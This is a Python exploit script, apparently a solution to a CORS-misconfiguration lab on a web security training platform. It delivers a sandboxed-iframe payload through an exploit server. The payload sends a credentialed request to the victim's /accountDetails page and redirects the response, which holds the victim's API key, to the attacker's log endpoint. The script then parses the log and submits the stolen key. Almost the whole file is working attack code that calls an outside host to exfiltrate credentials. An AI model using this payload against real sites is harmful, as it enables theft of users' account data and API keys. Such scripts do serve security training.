import requests
import urllib3
from sys import argv
import re
import urllib.parse

try:
    import termcolor
except:
    import os
    os.system("pip3 install termcolor")
    import termcolor
				
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

					# set this proxy for burp
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def red(text):
    return termcolor.colored(text,"red")


def get_website_urls():
	if len(argv) != 3:
		print(f"[+] usage {argv[0]} <url> <exploit_server_url>")
		print(f"[+] example {argv[0]} 'http://example.com' 'http://exploit.server.com'")
		exit(-1)
	if argv[1][-1] == '/':
		url = argv[1][:-1]
	else:
		url = argv[1]

	if argv[2][-1] == '/':
		exlpoit_server = argv[2][:-1]
	else:
		exlpoit_server = argv[2]

	return url, exlpoit_server

def attack():
	print("[+] Starting attack")
	url, exlpoit_server = get_website_urls()
	accountDetails_path = "/accountDetails"
	submit_path = "/submitSolution"
	server_logs = "/log"
	cors_payload = "\n\
<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,\n\
	<script>\n\
		var req = new XMLHttpRequest();\n\
		req.onload = reqListener;\n\
		req.open('get','%s',true);\n\
		req.withCredentials = true;\n\
		req.send();\n\
		function reqListener() {\n\
		location='%s/log?key='+this.responseText;\n\
		};\n\
	</script>\">\n\
</iframe>" % (url + accountDetails_path, exlpoit_server)

	params = {
        "urlIsHttps":"on",
        "responseFile":"/exploit",
        "responseHead":"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody":cors_payload,
        "formAction":"DELIVER_TO_VICTIM"
    }
	print(f"[+] sending cors payload : {red(cors_payload)}")

	r = requests.post(exlpoit_server, data=params)

	r = requests.get(exlpoit_server + server_logs)

	api_content = []
	pattern = r'key={([^}]+)}'
	matches = re.findall(pattern, r.text)
	for match in matches:
		api_content = urllib.parse.unquote(match)

	api_Key_value = api_content.split(",")[2].split(":")[1].replace('"',"").replace(" ","")
	print(f"[+] extract api key value : {red(api_Key_value)}")
	params = {"answer": api_Key_value}
	r = requests.post(url + submit_path, data=params)

	r = requests.get(url)
	if 'Congratulations' in r.text:
		print("[+] attack successfully")
	else:
		r = requests.get(url)
		if 'Congratulations' in r.text:
			print("[+] attack successfully")
		else:
			print("[-] attack unsuccessfully")

attack()